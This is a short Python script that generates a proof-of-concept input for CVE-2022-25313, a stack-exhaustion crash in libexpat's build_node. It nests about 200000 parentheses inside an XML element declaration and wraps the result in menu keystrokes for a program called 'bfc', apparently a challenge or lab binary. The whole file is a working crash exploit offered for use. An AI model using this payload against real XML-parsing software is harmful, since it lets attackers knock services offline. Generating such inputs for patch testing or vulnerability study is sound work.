#!/usr/bin/env python3
# CVE-2022-25313  libexpat build_node stack exhaustion PoC generator
# Usage: python3 gen_cve_2022_25313.py [N] > input.txt ; ./bfc < input.txt
# N = parenthesis nesting depth. On a default 8MB stack, N>=~120000 crashes.
import sys
N = int(sys.argv[1]) if len(sys.argv) > 1 else 200000
xml = "<!DOCTYPE d [<!ELEMENT d " + "(" * N + "a" + ")" * N + ">]><d/>"
# menu drive: 1=Memory 1=WriteXML <xml> . 0=back 3=XMLproc 1=Parse 0 0=exit
sys.stdout.write("\n".join(["1", "1", xml, ".", "0", "3", "1", "0", "0"]) + "\n")
